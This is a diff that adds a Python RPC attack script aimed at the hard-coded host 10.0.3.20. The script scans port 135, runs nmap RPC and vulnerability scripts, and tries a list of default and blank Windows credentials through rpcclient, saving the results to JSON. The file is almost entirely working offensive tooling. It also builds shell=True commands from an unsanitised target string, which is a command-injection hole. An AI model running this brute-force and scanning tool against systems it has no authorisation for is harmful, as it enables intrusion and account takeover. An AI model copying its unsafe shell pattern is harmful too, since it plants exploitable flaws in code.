@@ -1,0 +1,144 @@
+#!/usr/bin/env python3
+
+import subprocess
+import json
+import os
+import socket
+from datetime import datetime
+
+def run_command(command, timeout=120):
+    """Run a system command and return results"""
+    try:
+        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=timeout)
+        return {
+            'success': result.returncode == 0,
+            'output': result.stdout,
+            'error': result.stderr,
+            'returncode': result.returncode
+        }
+    except subprocess.TimeoutExpired:
+        return {'success': False, 'error': 'Command timed out', 'output': ''}
+    except Exception as e:
+        return {'success': False, 'error': str(e), 'output': ''}
+
+def check_port_open(target_ip, port, timeout=2):
+    """Check if a port is actually open"""
+    try:
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+            s.settimeout(timeout)
+            result = s.connect_ex((target_ip, port))
+            return result == 0
+    except:
+        return False
+
+def rpc_enumeration(target_ip):
+    """Enumerate RPC services without impacket dependency"""
+    print(f"[*] Enumerating RPC services on {target_ip}")
+    
+    results = {}
+    
+    # Check if port 135 is actually open
+    port_open = check_port_open(target_ip, 135)
+    results['port_135_open'] = port_open
+    
+    if not port_open:
+        results['error'] = 'Port 135 is not open'
+        return results
+    
+    # Method 1: rpcinfo (if available)
+    rpcinfo_result = run_command(f"rpcinfo -p {target_ip}")
+    results['rpcinfo'] = rpcinfo_result
+    
+    # Method 2: nmap RPC scripts
+    nmap_result = run_command(f"nmap -p 135 --script rpcinfo {target_ip}")
+    results['nmap_rpc'] = nmap_result
+    
+    # Method 3: Basic socket connection test
+    try:
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+            s.settimeout(5)
+            s.connect((target_ip, 135))
+            results['socket_test'] = {'success': True, 'output': 'Connected to port 135'}
+    except Exception as e:
+        results['socket_test'] = {'success': False, 'error': str(e)}
+    
+    return results
+
+def check_rpc_vulnerabilities(target_ip):
+    """Check for RPC vulnerabilities without impacket"""
+    print(f"[*] Checking RPC vulnerabilities on {target_ip}")
+    
+    results = {}
+    
+    # Use nmap for vulnerability scanning
+    vuln_scan = run_command(f"nmap -p 135 --script vuln {target_ip}")
+    results['vulnerability_scan'] = vuln_scan
+    
+    # Check for specific RPC issues
+    rpc_scan = run_command(f"nmap -p 135 --script rpc-grind {target_ip}")
+    results['rpc_grind'] = rpc_scan
+    
+    return results
+
+def rpc_brute_force(target_ip):
+    """Try RPC brute force attacks"""
+    print(f"[*] Testing RPC authentication on {target_ip}")
+    
+    results = {}
+    
+    # Test common username/password combinations
+    common_creds = [
+        ('administrator', 'administrator'),
+        ('admin', 'admin'),
+        ('guest', ''),
+        ('guest', 'guest'),
+        ('', ''),
+        ('administrator', 'password'),
+        ('admin', 'password'),
+        ('administrator', 'Password123'),
+    ]
+    
+    auth_results = {}
+    for username, password in common_creds:
+        if username and password:
+            auth_cmd = f"rpcclient -U '{username}%{password}' {target_ip} -c 'getusername'"
+        else:
+            auth_cmd = f"rpcclient -U '' -N {target_ip} -c 'getusername'"
+        
+        result = run_command(auth_cmd)
+        auth_results[f"{username}:{password}"] = result
+    
+    results['authentication_tests'] = auth_results
+    return results
+
+def run_rpc_attacks(target_ip):
+    """Main function to run all RPC attacks without impacket dependency"""
+    print(f"\n{'='*60}")
+    print(f"RPC ATTACK MODULE - Target: {target_ip}")
+    print(f"{'='*60}")
+    
+    results = {
+        'target': target_ip,
+        'timestamp': datetime.now().isoformat(),
+        'rpc_attacks': {}
+    }
+    
+    # Run all RPC attacks
+    results['rpc_attacks']['enumeration'] = rpc_enumeration(target_ip)
+    results['rpc_attacks']['vulnerability_scan'] = check_rpc_vulnerabilities(target_ip)
+    results['rpc_attacks']['authentication_tests'] = rpc_brute_force(target_ip)
+    
+    # Save results
+    os.makedirs('results/rpc_attacks', exist_ok=True)
+    filename = f"results/rpc_attacks/rpc_attack_{target_ip}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
+    
+    with open(filename, 'w') as f:
+        json.dump(results, f, indent=4)
+    
+    print(f"[+] RPC attack results saved to {filename}")
+    return results
+
+if __name__ == "__main__":
+    target = "10.0.3.20"
+    results = run_rpc_attacks(target)
+    print(f"\nRPC Attack completed.")
